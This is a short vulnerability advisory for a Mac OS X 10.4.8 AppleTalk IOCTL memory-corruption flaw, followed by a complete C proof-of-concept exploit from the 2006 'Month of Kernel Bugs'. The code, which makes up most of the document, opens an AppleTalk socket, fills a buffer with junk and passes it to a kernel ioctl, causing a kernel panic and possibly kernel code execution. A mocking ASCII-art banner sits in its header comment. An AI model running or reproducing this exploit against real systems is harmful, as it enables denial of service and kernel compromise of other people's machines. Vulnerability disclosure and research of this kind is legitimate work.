source: http://www.securityfocus.com/bid/21317/info

Apple Mac OS X is prone to a local memory-corruption vulnerability. This issue occurs when the operating system fails to handle specially crafted arguments to an IOCTL call. 

Due to the nature of this issue, an attacker may be able to execute arbitrary machine code in the context of the affected kernel, but this has not been confirmed. Failed exploit attempts result in kernel panics, denying service to legitimate users.

Mac OS X version 10.4.8 is vulnerable to this issue; other versions may also be affected.

/*
 * Copyright 2006 (c) LMH <lmh@info-pull.com>.
 * All Rights Reserved.
 * ----           
 *
 *               .--. .--.           _____________________________________
 *          _..-: (X :  o :-.._     / heya! me Gruber Duckie. I'm an �ber |
 *      .-''    `.__.:.__.'    ``-./___    proud zealot and Mac Beggar!   |
 *    .'          .'   `.          `.  \__________________________________|
 *   :  '.        :     :        .'  ;  (...fear my Delusional Zealot Army !)
 *   :    :-..__  `.___.'  __..-;    ;
 *   `.    `.   ''-------''   .'    ,'
 *     `.    `.             .'    .' 
 *       `._   `-._     _.-'   _.'   kudos to ilja, kevin, hdm, johnnycsh, et al.
 *          `-._   '"'"'   _.-'      proof of concept for MOKB-27-11-2006.
 *              ``-------''
 */

#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/sockio.h>

typedef struct at_state {
	unsigned int	flags;
} at_state_t;

/* if testing on PPC, you need to use the proper values. read netat/at_var.h */
#undef	AF_APPLETALK
#define AIOCGETSTATE	0x8021610b	/* get AT global state */
#define AIOCREGLOCALZN	0x8021610b
#define AT_ST_STARTED	0x0001
#define	AF_APPLETALK	0x10

char powder[4096];

unsigned long do_semtex(char *p, size_t len) {
	int i;
    size_t longsize = sizeof(long);
    unsigned long *daringwussball;

	daringwussball = (unsigned long *)p;
	for (i = 0; i < len; i+=longsize) {
		*daringwussball++ = 0x61;
	}

	return (unsigned long)&powder;
}

int main(int argc, char **argv) {
        int fd;
        at_state_t global_state;
		unsigned long pkt;

        if ((fd = socket(AF_APPLETALK, SOCK_RAW, 0)) < 0)
                exit(1);

		/* check if AppleTalk stack has been started */
        if (ioctl(fd, AIOCGETSTATE, &global_state) < 0) {
                close(fd);
                exit(2);
        }

        if (global_state.flags & AT_ST_STARTED) {
                printf("appletalk-exploit-1: 0x%08x\n", global_state);
        } else {
                printf("appletalk-exploit-1: AppleTalk isn't enabled!\n");
                exit(3);
        }

		pkt = do_semtex(powder, sizeof(powder));
		ioctl(fd, AIOCREGLOCALZN, pkt);

        close(fd);
        return 0;
}